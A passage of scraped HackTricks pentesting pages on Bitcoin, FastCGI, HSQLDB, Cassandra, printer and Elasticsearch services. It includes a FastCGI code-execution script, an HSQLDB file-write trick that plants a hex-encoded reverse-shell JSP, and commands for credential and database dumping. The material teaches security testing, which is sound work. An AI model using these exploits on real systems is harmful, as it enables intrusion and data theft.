‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n8086 - Pentesting InfluxDB\nNext\n- Network Services Pentesting\n8333,18333,38333,18444 - Pentesting Bitcoin\nLast modified\n6mo ago"
    },
    {
        "title": "8333,18333,38333,18444 - Pentesting Bitcoin",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/8333-18333-38333-18444-pentesting-bitcoin",
        "text": "8333,18333,38333,18444 - Pentesting Bitcoin\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nThe\nport 8333\nis used by Bitcoin nodes in the\nmainnet\nto communicate between them.\nThe\nport 18333\nis used Bitcoin nodes in the\ntestnet\nto communicate between them.\nThe\nport 38333\nis used Bitcoin nodes in the\nsignet\nto communicate between them.\nThe\nport 18444\nis used Bitcoin nodes in the\nregtest\n(local) to communicate between them.\nDefault port:\n8333, 18333, 38333, 18444\nPORT      STATE SERVICE\n8333/tcp open  bitcoin\nShodan\nport:8333 bitcoin\nUser-Agent: /Satoshi\nEnumeration\nBitcoin nodes will give you some information if they think that you are another valid bitcoin node.\nNmap\nhave some script to extract this information:\nsudo nmap -p 8333 --script bitcoin-info --script bitcoin-getaddr 170.39.103.39\nPORT     STATE SERVICE\n8333/tcp open  bitcoin\n| bitcoin-info:\n|   Timestamp: 2022-04-08T22:33:58\n|   Network: main\n|   Version: 0.7.0\n|   Node Id: 1bea074ea4f6eca3\n|   Lastblock: 731027\n|_  User Agent: /Satoshi:0.19.1/\n‚Äã\nsudo nmap -p 8333 --script bitcoin-getaddr 170.39.103.39\nPORT     STATE SERVICE\n8333/tcp open  bitcoin\n| bitcoin-getaddr:\n|   ip                                            timestamp\n|   2a02:c7e:486a:2b00:3d26:db39:537f:59f2:8333   2022-03-25T07:30:45\n|   2600:1f1c:2d3:2403:7b7d:c11c:ca61:f6e2:8333   2022-04-08T07:16:38\n|   75.128.4.27:8333                              2022-04-02T08:10:45\n[...]\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n8089 - Pentesting Splunkd\nNext\n- Network Services Pentesting\n9000 - Pentesting FastCGI\nLast modified\n6mo ago"
    },
    {
        "title": "9000 - Pentesting FastCGI",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi",
        "text": "9000 - Pentesting FastCGI\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nIf you want to\nlearn what is FastCGI\ncheck the following page:\ndisable_functions bypass - php-fpm/FastCGI\nBy default\nFastCGI\nrun in\nport\n9000\nand isn't recognized by nmap.\nUsually\nFastCGI only listen in\nlocalhost\n.\nRCE\nIt's quiet easy to make FastCGI execute arbitrary code:\n#!/bin/bash\n‚Äã\nPAYLOAD\n=\n\"<?php echo '<!--'; system('whoami'); echo '-->';\"\nFILENAMES\n=\n\"/var/www/public/index.php\"\n# Exisiting file path\n‚Äã\nHOST\n=\n$1\nB64\n=\n$(\necho\n\"\n$PAYLOAD\n\"\n|\nbase64\n)\n‚Äã\nfor\nFN\nin\n$FILENAMES\n;\ndo\nOUTPUT\n=\n$(\nmktemp\n)\nenv\n-i\n\\\nPHP_VALUE\n=\n\"allow_url_include=1\"$'\n\\n\n'\n\"allow_url_fopen\n=\n1\n\"$'\n\\n\n'\"\nauto_prepend_file\n=\n'data://text/plain\\;base64,$B64'\n\"\n\\\nSCRIPT_FILENAME\n=\n$FN\nSCRIPT_NAME\n=\n$FN\nREQUEST_METHOD\n=\nPOST\n\\\ncgi-fcgi\n-bind\n-connect\n$HOST\n:9000\n&>\n$OUTPUT\n‚Äã\ncat\n$OUTPUT\ndone\nor you can also use the following python script:\nhttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n8333,18333,38333,18444 - Pentesting Bitcoin\nNext\n- Network Services Pentesting\n9001 - Pentesting HSQLDB\nLast modified\n6mo ago"
    },
    {
        "title": "9001 - Pentesting HSQLDB",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/9001-pentesting-hsqldb",
        "text": "9001 - Pentesting HSQLDB\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nHSQLDB (\nHyperSQL DataBase\n) is the leading SQL relational database system written in Java. It offers a small, fast multithreaded and transactional database engine with in-memory and disk-based tables and supports embedded and server modes.\nDefault port:\n9001\n9001/tcp open  jdbc      HSQLDB JDBC (Network Compatibility Version 2.3.4.0)\nInformation\nDefault Settings\nNote that by default this service is likely running in memory or is bound to localhost. If you found it, you probably exploited another service and are looking to escalate privileges.\nDefault credentials are usually\nsa\nwith a blank password.\nIf you‚Äôve exploited another service, search for possible credentials using\ngrep -rP 'jdbc:hsqldb.*password.*' /path/to/search\nNote the database name carefully - you‚Äôll need it to connect.\nInfo Gathering\nConnect to the DB instance by\ndownloading HSQLDB\nand extracting\nhsqldb/lib/hsqldb.jar\n. Run the GUI app (eww) using\njava -jar hsqldb.jar\nand connect to the instance using the discovered/weak credentials.\nNote the connection URL will look something like this for a remote system:\njdbc:hsqldb:hsql://ip/DBNAME\n.\nTricks\nJava Language Routines\nWe can call static methods of a Java class from HSQLDB using Java Language Routines. Do note that the called class needs to be in the application‚Äôs classpath.\nJRTs can be\nfunctions\nor\nprocedures\n. Functions can be called via SQL statements if the Java method returns one or more SQL-compatible primitive variables. They are invoked using the\nVALUES\nstatement.\nIf the Java method we want to call returns void, we need to use a procedure invoked with the\nCALL\nstatement.\nReading Java System Properties\nCreate function:\nCREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA\nDETERMINISTIC NO SQL\nEXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'\nExecute function:\nVALUES(getsystemproperty('user.name'))\nYou can find a\nlist of system properties here\n.\nWrite Content to File\nYou can use the\ncom.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename\nJava gadget located in the JDK (auto loaded into the class path of the application) to write hex-encoded items to disk via a custom procedure.\nNote the maximum size of 1024 bytes\n.\nCreate procedure:\nCREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))\nLANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME\n'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'\nExecute procedure:\ncall writetofile('/path/ROOT/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3131392[...]' AS VARBINARY(1024)))\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n9000 - Pentesting FastCGI\nNext\n- Network Services Pentesting\n9042/9160 - Pentesting Cassandra\nLast modified\n6mo ago"
    },
    {
        "title": "9042/9160 - Pentesting Cassandra",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/cassandra",
        "text": "9042/9160 - Pentesting Cassandra\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nApache Cassandra is a highly scalable, high-performance distributed database designed to handle large amounts of data across many commodity servers, providing high availability with no single point of failure. It is a type of NoSQL database.\nIn several cases you will find\ncassandra accepting any credentials\n(as there aren't any configured) and you will be able to enumerate the database.\nDefault port:\n9042,9160\nPORT     STATE SERVICE   REASON\n9042/tcp open  cassandra-native Apache Cassandra 3.10 or later (native protocol versions 3/v3, 4/v4, 5/v5-beta)\n9160/tcp open  cassandra syn-ack\nEnumeration\nManual\npip\ninstall\ncqlsh\ncqlsh\n<\nIP\n>\n#Basic info enumeration\nSELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local\n;\n#Keyspace enumeration\nSELECT keyspace_name FROM system.schema_keyspaces\n;\ndesc\n<\nKeyspace_name\n>\n#Decribe that DB\ndesc system_auth\n#Describe the DB called system_auth\nSELECT * from system_auth.roles\n;\n#Retreive that info, can contain credential hashes\nSELECT * from logdb.user_auth\n;\n#Can contain credential hashes\nSELECT * from logdb.user\n;\nSELECT * from configuration.\n\"config\"\n;\nAutomated\nThere aren't much options here and nmap doesn't obtain much info\nnmap\n-sV\n--script\ncassandra-info\n-p\n<\nPORT\n>\n<\nIP\n>\n‚Äã\nBrute force\n‚Äã\nShodan\nport:9160 Cluster\nport:9042 \"Invalid or unsupported protocol version\"\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n9001 - Pentesting HSQLDB\nNext\n- Network Services Pentesting\n9100 - Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)\nLast modified\n6mo ago"
    },
    {
        "title": "9100 - Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/9100-pjl",
        "text": "9100 - Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nRaw printing is what we define as the process of making a connection to port 9100/tcp of a network printer. It is the default method used by CUPS and the Windows printing architecture to communicate with network printers as it is considered as ‚Äò\nthe simplest, fastest, and generally the most reliable network protocol used for printers\n‚Äô. Raw port 9100 printing, also referred to as JetDirect, AppSocket or PDL-datastream actually\nis not a printing protocol by itself\n. Instead\nall data sent is directly processed by the printing device\n, just like a parallel connection over TCP. In contrast to LPD, IPP and SMB, this can send direct feedback to the client, including status and error messages. Such a\nbidirectional channel\ngives us direct\naccess\nto\nresults\nof\nPJL\n,\nPostScript\nor\nPCL\ncommands. Therefore raw port 9100 printing ‚Äì which is supported by almost any network printer ‚Äì is used as the channel for security analysis with PRET and PFT. (From\nhere\n)\nIf you want to learn more about\nhacking printers read this page\n.\nDefault port:\n9100\n9100/tcp open  jetdirect\nEnumeration\nManual\nnc\n-vn\n<\nIP\n>\n9100\n@PJL INFO STATUS\n#CODE=40000   DISPLAY=\"Sleep\"   ONLINE=TRUE\n@PJL INFO ID\n# ID (Brand an version): Brother HL-L2360D series:84U-F75:Ver.b.26\n@PJL INFO PRODINFO\n#Product info\n@PJL FSDIRLIST\nNAME\n=\n\"0:\n\\\n\"\nENTRY\n=\n1\nCOUNT\n=\n65535\n#List dir\n@PJL INFO VARIABLES\n#Env variales\n@PJL INFO FILESYS\n#?\n@PJL INFO TIMEOUT\n#Timeout variables\n@PJL RDYMSG\n#Ready message\n@PJL FSINIT\n@PJL FSDIRLIST\n@PJL FSUPLOAD\n#Useful to upload a file\n@PJL FSDOWNLOAD\n#Useful to download a file\n@PJL FSDELETE\n#Useful to delete a file\nAutomatic\nnmap\n-sV\n--script\npjl-ready-message\n-p\n<\nPORT\n>\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/printer/printer_env_vars\nmsf\n>\nuse auxiliary/scanner/printer/printer_list_dir\nmsf\n>\nuse auxiliary/scanner/printer/printer_list_volumes\nmsf\n>\nuse auxiliary/scanner/printer/printer_ready_message\nmsf\n>\nuse auxiliary/scanner/printer/printer_version_info\nmsf\n>\nuse auxiliary/scanner/printer/printer_download_file\nmsf\n>\nuse auxiliary/scanner/printer/printer_upload_file\nmsf\n>\nuse auxiliary/scanner/printer/printer_delete_file\nPrinters Hacking tool\nThis is the tool you want to use to abuse printers:\nGitHub - RUB-NDS/PRET: Printer Exploitation Toolkit - The tool that made dumpster diving obsolete.\nGitHub\nHacking Printers best reference\nFile system access - Hacking Printers\nShodan\npjl port:9100\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n9042/9160 - Pentesting Cassandra\nNext\n- Network Services Pentesting\n9200 - Pentesting Elasticsearch\nLast modified\n6mo ago"
    },
    {
        "title": "9200 - Pentesting Elasticsearch",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch",
        "text": "9200 - Pentesting Elasticsearch\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic information\nFrom the\nmain page\nyou can find some useful descriptions:\nElasticsearch is a distributed, open source search and analytics engine for all types of data, including textual, numerical, geospatial, structured, and unstructured. Elasticsearch is built on Apache Lucene and was first released in 2010 by Elasticsearch N.V. (now known as Elastic). Known for its simple REST APIs, distributed nature, speed, and scalability, Elasticsearch is the central component of the Elastic Stack, a set of open source tools for data ingestion, enrichment, storage, analysis, and visualization. Commonly referred to as the ELK Stack (after Elasticsearch, Logstash, and Kibana), the Elastic Stack now includes a rich collection of lightweight shipping agents known as Beats for sending data to Elasticsearch.\nWhat is an Elasticsearch index?\nAn Elasticsearch\nindex\nis a collection of documents\nthat are related to each other. Elasticsearch stores data as JSON documents. Each document correlates a set of\nkeys\n(names of fields or properties) with their corresponding values (strings, numbers, Booleans, dates, arrays of\nvalues\n, geolocations, or other types of data).\nElasticsearch uses a data structure called an\ninverted index\n, which is designed to allow very fast full-text searches. An inverted index lists every unique word that appears in any document and identifies all of the documents each word occurs in.\nDuring the indexing process, Elasticsearch stores documents and builds an inverted index to make the document data searchable in near real-time. Indexing is initiated with the index API, through which you can add or update a JSON document in a specific index.\nDefault port\n: 9200/tcp\nManual Enumeration\nBanner\nThe protocol used to access Elasticsearch is\nHTTP\n. When you access it via HTTP you will find some interesting information:\nhttp://10.10.10.115:9200/\nIf you don't see that response accessing\n/\nsee the following section.\nAuthentication\nBy default Elasticsearch doesn't have authentication enabled\n, so by default you can access everything inside the database without using any credentials.\nYou can verify that authentication is disabled with a request to:\ncurl\n-X\nGET\n\"ELASTICSEARCH-SERVER:9200/_xpack/security/user\"\n{\n\"error\"\n:\n{\n\"root_cause\"\n:\n[{\n\"type\"\n:\n\"exception\"\n,\n\"reason\"\n:\n\"Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node.\"\n}]\n,\n\"type\"\n:\n\"exception\"\n,\n\"reason\"\n:\n\"Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node.\"\n}\n,\n\"status\"\n:500\n}\nHowever\n, if you send a request to\n/\nand receives a response like the following one:\n{\n\"error\"\n:\n{\n\"root_cause\"\n:\n[{\n\"type\"\n:\n\"security_exception\"\n,\n\"reason\"\n:\n\"missing authentication credentials for REST request [/]\"\n,\n\"header\"\n:\n{\n\"WWW-Authenticate\"\n:\n\"Basic realm=\n\\\"\nsecurity\n\\\"\ncharset=\n\\\"\nUTF-8\n\\\"\n\"\n}}]\n,\n\"type\"\n:\n\"security_exception\"\n,\n\"reason\"\n:\n\"missing authentication credentials for REST request [/]\"\n,\n\"header\"\n:\n{\n\"WWW-Authenticate\"\n:\n\"Basic realm=\n\\\"\nsecurity\n\\\"\ncharset=\n\\\"\nUTF-8\n\\\"\n\"\n}}\n,\n\"status\"\n:401\n}\nThat will means that authentication is configured an\nyou need valid credentials\nto obtain any info from elasticserach. Then, you can\ntry to bruteforce it\n(it uses HTTP basic auth, so anything that BF HTTP basic auth can be used).\nHere you have a\nlist default usernames\n:\nelastic\n(superuser), remote_monitoring_user, beats_system, logstash_system, kibana, kibana_system, apm_system,\n_anonymous_._ Older versions of Elasticsearch have the default password\nchangeme\nfor this user\ncurl -X GET http://user:password@IP:9200/\nBasic User Enumeration\n#List all roles on the system:\ncurl\n-X\nGET\n\"ELASTICSEARCH-SERVER:9200/_security/role\"\n‚Äã\n#List all users on the system:\ncurl\n-X\nGET\n\"ELASTICSEARCH-SERVER:9200/_security/user\"\n‚Äã\n#Get more information about the rights of an user:\ncurl\n-X\nGET\n\"ELASTICSEARCH-SERVER:9200/_security/user/<USERNAME>\"\nElastic Info\nHere are some endpoints that you can\naccess via GET\nto\nobtain\nsome\ninformation\nabout elasticsearch:\n_cat\n/_cluster\n/_security\n/_cat/segments\n/_cluster/allocation/explain\n/_security/user\n/_cat/shards\n/_cluster/settings\n/_security/privilege\n/_cat/repositories\n/_cluster/health\n/_security/role_mapping\n/_cat/recovery\n/_cluster/state\n/_security/role\n/_cat/plugins\n/_cluster/stats\n/_security/api_key\n/_cat/pending_tasks\n/_cluster/pending_tasks\n‚Äã\n/_cat/nodes\n/_nodes\n‚Äã\n/_cat/tasks\n/_nodes/usage\n‚Äã\n/_cat/templates\n/_nodes/hot_threads\n‚Äã\n/_cat/thread_pool\n/_nodes/stats\n‚Äã\n/_cat/ml/trained_models\n/_tasks\n‚Äã\n/_cat/transforms/_all\n/_remote/info\n‚Äã\n/_cat/aliases\n‚Äã\n‚Äã\n/_cat/allocation\n‚Äã\n‚Äã\n/_cat/ml/anomaly_detectors\n‚Äã\n‚Äã\n/_cat/count\n‚Äã\n‚Äã\n/_cat/ml/data_frame/analytics\n‚Äã\n‚Äã\n/_cat/ml/datafeeds\n‚Äã\n‚Äã\n/_cat/fielddata\n‚Äã\n‚Äã\n/_cat/health\n‚Äã\n‚Äã\n/_cat/indices\n‚Äã\n‚Äã\n/_cat/master\n‚Äã\n‚Äã\n/_cat/nodeattrs\n‚Äã\n‚Äã\n/_cat/nodes\n‚Äã\n‚Äã\nThese endpoints were\ntaken from the documentation\nwhere you can\nfind more\n.\nAlso, if you access\n/_cat\nthe response will contain the\n/_cat/*\nendpoints supported by the instance.\nIn\n/_security/user\n(if auth enabled) you can see which user has role\nsuperuser\n.\nIndices\nYou can\ngather all the indices\naccessing\nhttp://10.10.10.115:9200/_cat/indices?v\nhealth status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size\ngreen  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb\nyellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb\nyellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb\nTo obtain\ninformation about which kind of data is saved inside an index\nyou can access:\nhttp://host:9200/<index>\nfrom example in this case\nhttp://10.10.10.115:9200/bank\nDump index\nIf you want to\ndump all the contents\nof an index you can access:\nhttp://host:9200/<index>/_search?pretty=true\nlike\nhttp://10.10.10.115:9200/bank/_search?pretty=true\nTake a moment to compare the contents of the each document (entry) inside the bank index and the fields of this index that we saw in the previous section.\nSo, at this point you may notice that\nthere is a field called \"total\" inside \"hits\"\nthat indicates that\n1000 documents were found\ninside this index but only 10 were retried. This is because\nby default there is a limit of 10 documents\n.\nBut, now that you know that\nthis index contains 1000 documents\n, you can\ndump all of them\nindicating the number of entries you want to dump in the\nsize\nparameter:\nhttp://10.10.10.115:9200/quotes/_search?pretty=true&size=1000\nasd\nNote: If you indicate bigger number all the entries will be dumped anyway, for example you could indicate\nsize=9999\nand it will be weird if there were more entries (but you should check).\nDump all\nIn order to dump all you can just go to the\nsame path as before but without indicating any index\nhttp://host:9200/_search?pretty=true\nlike\nhttp://10.10.10.115:9200/_search?pretty=true\nRemember that in this case the\ndefault limit of 10\nresults will be applied. You can use the\nsize\nparameter to dump a\nbigger amount of results\n. Read the previous section for more information.\nSearch\nIf you are looking for some information you can do a\nraw search on all the indices\ngoing to\nhttp://host:9200/_search?pretty=true&q=<search_term>\nlike in\nhttp://10.10.10.115:9200/_search?pretty=true&q=Rockwell\nIf you want just to\nsearch on an index\nyou can just\nspecify\nit on the\npath\n:\nhttp://host:9200/<index>/_search?pretty=true&q=<search_term>\nNote that the q parameter used to search content\nsupports regular expressions\nYou can also use something like\nhttps://github.com/misalabs/horuz\nto fuzz an elasticsearch service.\nWrite permissions\nYou can check your write permissions trying to create a new document inside a new index running something like the following:\ncurl\n-X\nPOST\n'10.10.10.115:9200/bookindex/books'\n-H\n'Content-Type: application/json'\n-d\n'\n{\n\"bookId\" : \"A00-3\",\n\"author\" : \"Sankaran\",\n\"publisher\" : \"Mcgrahill\",\n\"name\" : \"how to get a job\"\n}'\nThat cmd will create a\nnew index\ncalled\nbookindex\nwith a document of type\nbooks\nthat has the attributes \"\nbookId\n\", \"\nauthor\n\", \"\npublisher\n\" and \"\nname\n\"\nNotice how the\nnew index appears now in the list\n:\nAnd note the\nautomatically created properties\n:\nAutomatic Enumeration\nSome tools will obtain some of the data presented before:\nmsf\n>\nuse auxiliary/scanner/elasticsearch/indices_enum\nGitHub - theMiddleBlue/nmap-elasticsearch-nse: Nmap NSE script for enumerate indices, plugins and cluster nodes on an elasticsearch target\nGitHub\nShodan\nport:9200 elasticsearch\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin 